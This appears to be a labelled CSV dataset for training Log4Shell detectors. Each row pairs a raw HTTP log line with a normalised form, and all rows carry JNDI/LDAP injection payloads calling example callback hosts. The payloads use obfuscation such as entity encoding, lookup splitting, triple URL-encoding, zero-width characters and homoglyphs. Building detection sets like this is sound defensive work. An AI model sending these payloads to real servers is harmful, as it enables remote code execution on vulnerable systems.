id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
LS-002187,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://probe.example.net/html-decimal} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jndi:ldap://probe.example.net/html-decimal} | method: get | host: app.local | path: /home,1,log4shell,html_entity_jndi,user_agent,train,critical
LS-002188,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://probe.example.net/html-decimal},request from user-agent: ${jndi:ldap://probe.example.net/html-decimal},1,log4shell,html_entity_jndi,user_agent_minimal,train,critical
LS-002189,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${&#106;ndi:ldap://probe.example.net/html-decimal},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${jndi:ldap://probe.example.net/html-decimal},1,log4shell,html_entity_jndi,x_api_version,train,critical
LS-002190,2026-05-17,adversarial_evasion,GET /search?q=${&#106;ndi:ldap://probe.example.net/html-decimal} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${jndi:ldap://probe.example.net/html-decimal} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,html_entity_jndi,path,train,critical
LS-002191,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${&#106;ndi:ldap://probe.example.net/html-decimal},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/html-decimal},1,log4shell,html_entity_jndi,body,train,critical
LS-002192,2026-05-17,adversarial_evasion,GET /?q=${&#106;ndi:ldap://probe.example.net/html-decimal} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/html-decimal} http/1.1,1,log4shell,html_entity_jndi,minimal_query,train,critical
LS-002193,2026-05-17,adversarial_evasion,GET /api/check?debug=${&#106;ndi:ldap://probe.example.net/html-decimal} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/html-decimal} http/1.1 host: app.local,1,log4shell,html_entity_jndi,uri_param,train,critical
LS-002194,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://probe.example.net/html-decimal} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${jndi:ldap://probe.example.net/html-decimal} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,html_entity_jndi,user_agent,train,critical
LS-002195,2026-05-17,adversarial_evasion,Request from User-Agent: ${&#106;ndi:ldap://probe.example.net/html-decimal},request from user-agent: ${jndi:ldap://probe.example.net/html-decimal},1,log4shell,html_entity_jndi,user_agent_minimal,train,critical
LS-002196,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${&#106;ndi:ldap://probe.example.net/html-decimal},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: / | x-api-version: ${jndi:ldap://probe.example.net/html-decimal},1,log4shell,html_entity_jndi,x_api_version,train,critical
LS-002197,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/full-split} http/1.1,1,log4shell,lookup_character_concat,minimal_query,train,critical
LS-002198,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/full-split} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,train,critical
LS-002199,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndi:ldap://probe.example.net/full-split} | method: get | host: app.local | path: /static/app.js,1,log4shell,lookup_character_concat,user_agent,train,critical
LS-002200,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split},request from user-agent: ${jndi:ldap://probe.example.net/full-split},1,log4shell,lookup_character_concat,user_agent_minimal,train,critical
LS-002201,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndi:ldap://probe.example.net/full-split},1,log4shell,lookup_character_concat,x_api_version,train,critical
LS-002202,2026-05-17,adversarial_evasion,GET /search?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} HTTP/1.1 Host: app.local User-Agent: python-requests/2.31.0,get /search?q=${jndi:ldap://probe.example.net/full-split} http/1.1 host: app.local user-agent: python-requests/2.31.0,1,log4shell,lookup_character_concat,path,train,critical
LS-002203,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split},post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/full-split},1,log4shell,lookup_character_concat,body,train,critical
LS-002204,2026-05-17,adversarial_evasion,GET /?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/full-split} http/1.1,1,log4shell,lookup_character_concat,minimal_query,train,critical
LS-002205,2026-05-17,adversarial_evasion,GET /api/check?debug=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/full-split} http/1.1 host: app.local,1,log4shell,lookup_character_concat,uri_param,train,critical
LS-002206,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split} | Method: GET | Host: app.local | Path: /metrics,request from user-agent: ${jndi:ldap://probe.example.net/full-split} | method: get | host: app.local | path: /metrics,1,log4shell,lookup_character_concat,user_agent,train,critical
LS-002207,2026-05-17,adversarial_evasion,Request from User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split},request from user-agent: ${jndi:ldap://probe.example.net/full-split},1,log4shell,lookup_character_concat,user_agent_minimal,train,critical
LS-002208,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /api/products?id=123 | X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://probe.example.net/full-split},request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /api/products?id=123 | x-api-version: ${jndi:ldap://probe.example.net/full-split},1,log4shell,lookup_character_concat,x_api_version,train,critical
LS-002209,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://probe.example.net/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://probe.example.net/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-002210,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://probe.example.net/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://probe.example.net/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-002211,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-002212,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j},request from user-agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-002213,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${${date:'j'}ndi:ldap://probe.example.net/date-j},request from user-agent: curl/7.88.1 | method: get | host: app.local | path: / | x-api-version: ${${date:'j'}ndi:ldap://probe.example.net/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-002214,2026-05-17,adversarial_evasion,GET /search?q=${${date:'j'}ndi:ldap://probe.example.net/date-j} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${${date:'j'}ndi:ldap://probe.example.net/date-j} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,semantic_lookup_jndi,path,train,critical
LS-002215,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${${date:'j'}ndi:ldap://probe.example.net/date-j},post /search http/1.1 host: app.local body: query=${${date:'j'}ndi:ldap://probe.example.net/date-j},1,log4shell,semantic_lookup_jndi,body,train,critical
LS-002216,2026-05-17,adversarial_evasion,GET /?q=${${date:'j'}ndi:ldap://probe.example.net/date-j} HTTP/1.1,get /?q=${${date:'j'}ndi:ldap://probe.example.net/date-j} http/1.1,1,log4shell,semantic_lookup_jndi,minimal_query,train,critical
LS-002217,2026-05-17,adversarial_evasion,GET /api/check?debug=${${date:'j'}ndi:ldap://probe.example.net/date-j} HTTP/1.1 Host: app.local,get /api/check?debug=${${date:'j'}ndi:ldap://probe.example.net/date-j} http/1.1 host: app.local,1,log4shell,semantic_lookup_jndi,uri_param,train,critical
LS-002218,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j} | method: get | host: app.local | path: /search?q=boots,1,log4shell,semantic_lookup_jndi,user_agent,train,critical
LS-002219,2026-05-17,adversarial_evasion,Request from User-Agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j},request from user-agent: ${${date:'j'}ndi:ldap://probe.example.net/date-j},1,log4shell,semantic_lookup_jndi,user_agent_minimal,train,critical
LS-002220,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${${date:'j'}ndi:ldap://probe.example.net/date-j},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${${date:'j'}ndi:ldap://probe.example.net/date-j},1,log4shell,semantic_lookup_jndi,x_api_version,train,critical
LS-002221,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-002222,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-002223,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jndi:ldap://probe.example.net/triple-train} | method: get | host: app.local | path: /search?q=boots,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-002224,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://probe.example.net/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-002225,2026-05-17,adversarial_evasion,Request from User-Agent: curl/7.88.1 | Method: GET | Host: app.local | Path: /home | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D,request from user-agent: curl/7.88.1 | method: get | host: app.local | path: /home | x-api-version: ${jndi:ldap://probe.example.net/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-002226,2026-05-17,adversarial_evasion,GET /search?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${jndi:ldap://probe.example.net/triple-train} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,triple_url_encoded,path,train,critical
LS-002227,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D,post /search http/1.1 host: app.local body: query=${jndi:ldap://probe.example.net/triple-train},1,log4shell,triple_url_encoded,body,train,critical
LS-002228,2026-05-17,adversarial_evasion,GET /?q=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D HTTP/1.1,get /?q=${jndi:ldap://probe.example.net/triple-train} http/1.1,1,log4shell,triple_url_encoded,minimal_query,train,critical
LS-002229,2026-05-17,adversarial_evasion,GET /api/check?debug=%252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D HTTP/1.1 Host: app.local,get /api/check?debug=${jndi:ldap://probe.example.net/triple-train} http/1.1 host: app.local,1,log4shell,triple_url_encoded,uri_param,train,critical
LS-002230,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D | Method: GET | Host: app.local | Path: /login,request from user-agent: ${jndi:ldap://probe.example.net/triple-train} | method: get | host: app.local | path: /login,1,log4shell,triple_url_encoded,user_agent,train,critical
LS-002231,2026-05-17,adversarial_evasion,Request from User-Agent: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D,request from user-agent: ${jndi:ldap://probe.example.net/triple-train},1,log4shell,triple_url_encoded,user_agent_minimal,train,critical
LS-002232,2026-05-17,adversarial_evasion,Request from User-Agent: Go-http-client/1.1 | Method: GET | Host: app.local | Path: /login | X-Api-Version: %252524%25257Bjndi%25253Aldap%25253A%25252F%25252Fprobe.example.net%25252Ftriple-train%25257D,request from user-agent: go-http-client/1.1 | method: get | host: app.local | path: /login | x-api-version: ${jndi:ldap://probe.example.net/triple-train},1,log4shell,triple_url_encoded,x_api_version,train,critical
LS-002365,2026-05-17,adversarial_evasion,GET /?q=${j​ndi:ldap://lab-callback.example.org/zw-j} HTTP/1.1,get /?q=${j​ndi:ldap://lab-callback.example.org/zw-j} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-002366,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​ndi:ldap://lab-callback.example.org/zw-j} HTTP/1.1 Host: app.local,get /api/check?debug=${j​ndi:ldap://lab-callback.example.org/zw-j} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-002367,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://lab-callback.example.org/zw-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${j​ndi:ldap://lab-callback.example.org/zw-j} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-002368,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://lab-callback.example.org/zw-j},request from user-agent: ${j​ndi:ldap://lab-callback.example.org/zw-j},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-002369,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${j​ndi:ldap://lab-callback.example.org/zw-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /static/app.js | x-api-version: ${j​ndi:ldap://lab-callback.example.org/zw-j},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-002370,2026-05-17,adversarial_evasion,GET /search?q=${j​ndi:ldap://lab-callback.example.org/zw-j} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Safari/605.1.15,get /search?q=${j​ndi:ldap://lab-callback.example.org/zw-j} http/1.1 host: app.local user-agent: mozilla/5.0 safari/605.1.15,1,log4shell,zero_width_jndi,path,train,critical
LS-002371,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${j​ndi:ldap://lab-callback.example.org/zw-j},post /search http/1.1 host: app.local body: query=${j​ndi:ldap://lab-callback.example.org/zw-j},1,log4shell,zero_width_jndi,body,train,critical
LS-002372,2026-05-17,adversarial_evasion,GET /?q=${j​ndi:ldap://lab-callback.example.org/zw-j} HTTP/1.1,get /?q=${j​ndi:ldap://lab-callback.example.org/zw-j} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-002373,2026-05-17,adversarial_evasion,GET /api/check?debug=${j​ndi:ldap://lab-callback.example.org/zw-j} HTTP/1.1 Host: app.local,get /api/check?debug=${j​ndi:ldap://lab-callback.example.org/zw-j} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-002374,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://lab-callback.example.org/zw-j} | Method: GET | Host: app.local | Path: /login,request from user-agent: ${j​ndi:ldap://lab-callback.example.org/zw-j} | method: get | host: app.local | path: /login,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-002375,2026-05-17,adversarial_evasion,Request from User-Agent: ${j​ndi:ldap://lab-callback.example.org/zw-j},request from user-agent: ${j​ndi:ldap://lab-callback.example.org/zw-j},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-002376,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: / | X-Api-Version: ${j​ndi:ldap://lab-callback.example.org/zw-j},request from user-agent: java/11.0.13 | method: get | host: app.local | path: / | x-api-version: ${j​ndi:ldap://lab-callback.example.org/zw-j},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-002377,2026-05-17,adversarial_evasion,GET /?q=${jn‌di:ldap://lab-callback.example.org/zw-n} HTTP/1.1,get /?q=${jn‌di:ldap://lab-callback.example.org/zw-n} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-002378,2026-05-17,adversarial_evasion,GET /api/check?debug=${jn‌di:ldap://lab-callback.example.org/zw-n} HTTP/1.1 Host: app.local,get /api/check?debug=${jn‌di:ldap://lab-callback.example.org/zw-n} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-002379,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://lab-callback.example.org/zw-n} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${jn‌di:ldap://lab-callback.example.org/zw-n} | method: get | host: app.local | path: /search?q=boots,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-002380,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://lab-callback.example.org/zw-n},request from user-agent: ${jn‌di:ldap://lab-callback.example.org/zw-n},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-002381,2026-05-17,adversarial_evasion,Request from User-Agent: Java/11.0.13 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jn‌di:ldap://lab-callback.example.org/zw-n},request from user-agent: java/11.0.13 | method: get | host: app.local | path: /login | x-api-version: ${jn‌di:ldap://lab-callback.example.org/zw-n},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-002382,2026-05-17,adversarial_evasion,GET /search?q=${jn‌di:ldap://lab-callback.example.org/zw-n} HTTP/1.1 Host: app.local User-Agent: Mozilla/5.0 Chrome/120.0,get /search?q=${jn‌di:ldap://lab-callback.example.org/zw-n} http/1.1 host: app.local user-agent: mozilla/5.0 chrome/120.0,1,log4shell,zero_width_jndi,path,train,critical
LS-002383,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${jn‌di:ldap://lab-callback.example.org/zw-n},post /search http/1.1 host: app.local body: query=${jn‌di:ldap://lab-callback.example.org/zw-n},1,log4shell,zero_width_jndi,body,train,critical
LS-002384,2026-05-17,adversarial_evasion,GET /?q=${jn‌di:ldap://lab-callback.example.org/zw-n} HTTP/1.1,get /?q=${jn‌di:ldap://lab-callback.example.org/zw-n} http/1.1,1,log4shell,zero_width_jndi,minimal_query,train,critical
LS-002385,2026-05-17,adversarial_evasion,GET /api/check?debug=${jn‌di:ldap://lab-callback.example.org/zw-n} HTTP/1.1 Host: app.local,get /api/check?debug=${jn‌di:ldap://lab-callback.example.org/zw-n} http/1.1 host: app.local,1,log4shell,zero_width_jndi,uri_param,train,critical
LS-002386,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://lab-callback.example.org/zw-n} | Method: GET | Host: app.local | Path: /home,request from user-agent: ${jn‌di:ldap://lab-callback.example.org/zw-n} | method: get | host: app.local | path: /home,1,log4shell,zero_width_jndi,user_agent,train,critical
LS-002387,2026-05-17,adversarial_evasion,Request from User-Agent: ${jn‌di:ldap://lab-callback.example.org/zw-n},request from user-agent: ${jn‌di:ldap://lab-callback.example.org/zw-n},1,log4shell,zero_width_jndi,user_agent_minimal,train,critical
LS-002388,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${jn‌di:ldap://lab-callback.example.org/zw-n},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${jn‌di:ldap://lab-callback.example.org/zw-n},1,log4shell,zero_width_jndi,x_api_version,train,critical
LS-002389,2026-05-17,adversarial_evasion,GET /?q=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} HTTP/1.1,get /?q=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-002390,2026-05-17,adversarial_evasion,GET /api/check?debug=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-002391,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} | Method: GET | Host: app.local | Path: /api/products?id=123,request from user-agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} | method: get | host: app.local | path: /api/products?id=123,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-002392,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},request from user-agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-002393,2026-05-17,adversarial_evasion,Request from User-Agent: Mozilla/5.0 Safari/605.1.15 | Method: GET | Host: app.local | Path: /login | X-Api-Version: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},request from user-agent: mozilla/5.0 safari/605.1.15 | method: get | host: app.local | path: /login | x-api-version: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-002394,2026-05-17,adversarial_evasion,GET /search?q=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} HTTP/1.1 Host: app.local User-Agent: Go-http-client/1.1,get /search?q=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} http/1.1 host: app.local user-agent: go-http-client/1.1,1,log4shell,homoglyph_jndi,path,train,critical
LS-002395,2026-05-17,adversarial_evasion,POST /search HTTP/1.1 Host: app.local Body: query=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},post /search http/1.1 host: app.local body: query=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},1,log4shell,homoglyph_jndi,body,train,critical
LS-002396,2026-05-17,adversarial_evasion,GET /?q=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} HTTP/1.1,get /?q=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-002397,2026-05-17,adversarial_evasion,GET /api/check?debug=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} HTTP/1.1 Host: app.local,get /api/check?debug=${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-002398,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} | Method: GET | Host: app.local | Path: /search?q=boots,request from user-agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j} | method: get | host: app.local | path: /search?q=boots,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-002399,2026-05-17,adversarial_evasion,Request from User-Agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},request from user-agent: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-002400,2026-05-17,adversarial_evasion,Request from User-Agent: PostmanRuntime/7.36.1 | Method: GET | Host: app.local | Path: /static/app.js | X-Api-Version: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},request from user-agent: postmanruntime/7.36.1 | method: get | host: app.local | path: /static/app.js | x-api-version: ${ȷndi:ldap://lab-callback.example.org/latin-dotless-j},1,log4shell,homoglyph_jndi,x_api_version,train,critical
LS-002401,2026-05-17,adversarial_evasion,GET /?q=${jndі:ldap://lab-callback.example.org/cyrillic-i} HTTP/1.1,get /?q=${jndі:ldap://lab-callback.example.org/cyrillic-i} http/1.1,1,log4shell,homoglyph_jndi,minimal_query,train,critical
LS-002402,2026-05-17,adversarial_evasion,GET /api/check?debug=${jndі:ldap://lab-callback.example.org/cyrillic-i} HTTP/1.1 Host: app.local,get /api/check?debug=${jndі:ldap://lab-callback.example.org/cyrillic-i} http/1.1 host: app.local,1,log4shell,homoglyph_jndi,uri_param,train,critical
LS-002403,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i} | Method: GET | Host: app.local | Path: /static/app.js,request from user-agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i} | method: get | host: app.local | path: /static/app.js,1,log4shell,homoglyph_jndi,user_agent,train,critical
LS-002404,2026-05-17,adversarial_evasion,Request from User-Agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i},request from user-agent: ${jndі:ldap://lab-callback.example.org/cyrillic-i},1,log4shell,homoglyph_jndi,user_agent_minimal,train,critical
LS-002405,2026-05-17,adversarial_evasion,Request from User-Agent: python-requests/2.31.0 | Method: GET | Host: app.local | Path: /search?q=boots | X-Api-Version: ${jndі:ldap://lab-callback.example.org/cyrillic-i},request from user-agent: python-requests/2.31.0 | method: get | host: app.local | path: /search?q=boots | x-api-version: ${jndі:ldap://lab-callback.example.org/cyrillic-i},1,log4shell,homoglyph_jndi,x_api_version,train,critical
